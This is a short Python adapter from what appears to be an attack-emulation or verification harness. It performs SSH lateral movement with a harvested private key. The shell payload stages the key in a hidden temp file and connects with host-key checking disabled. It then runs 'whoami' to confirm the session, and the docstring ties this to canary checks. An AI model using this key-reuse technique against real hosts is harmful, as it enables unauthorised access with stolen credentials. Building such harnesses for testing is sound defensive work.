"""Lateral-SSH adapter — reused-key SSH lateral movement (T1021.004 + T1550).

Movement, not local escalation: use the credential recovered by
credential_read to SSH to the next host, then read that host's canary.
Success is the target canary, proving the reused key actually landed a session.
"""

from __future__ import annotations

from verifier.adapters import AdapterResult, RunContext, register
from verifier.signal import session_established


@register("lateral_ssh")
def lateral_ssh(ctx: RunContext) -> AdapterResult:
    """SSH to a target host using a harvested key and verify the session."""
    key_path = ctx.technique["key_path"]
    to_host = ctx.technique["to_host"]
    to_user = ctx.technique["to_user"]

    # OpenSSH requires private keys to be mode 0600.  Stage the harvested
    # 0644 key to a temporary file before connecting.
    payload = (
        f"TMPKEY=/tmp/.ascend_{ctx.run_id} && "
        f"cp {key_path} $TMPKEY 2>/dev/null && "
        f"chmod 600 $TMPKEY 2>/dev/null && "
        f"ssh -i $TMPKEY "
        f"-o StrictHostKeyChecking=no "
        f"-o BatchMode=yes "
        f"-o ConnectTimeout=10 "
        f"{to_user}@{to_host} "
        f"'whoami' 2>&1; "
        f"RET=$?; rm -f $TMPKEY; exit $RET"
    )
    cmd = ["sh", "-c", payload]

    ok, evidence = session_established(
        ctx.host, ctx.start_user, cmd, to_user,
        prefix=ctx.container_prefix,
    )
    return AdapterResult(escalated=ok, evidence=evidence, raw_cmd=cmd)

